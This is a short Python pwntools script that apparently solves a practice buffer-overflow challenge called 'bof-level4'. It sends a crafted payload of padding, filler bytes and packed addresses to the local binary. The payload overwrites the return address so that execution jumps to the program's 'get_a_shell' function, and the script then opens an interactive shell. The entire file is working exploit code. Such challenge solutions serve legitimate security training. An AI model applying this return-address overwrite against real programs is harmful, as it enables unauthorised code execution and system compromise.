#!/usr/bin/env python

from pwn import *

p = process('./bof-level4')
e = ELF('./bof-level4')

get_a_shell = e.symbols['get_a_shell']

buf = "1"*20 + "ABCDEFGH" + "BBBBCCCC" + p32(0x804876b) + "A"*12 + p32(get_a_shell)

p.sendline(buf)

p.interactive()
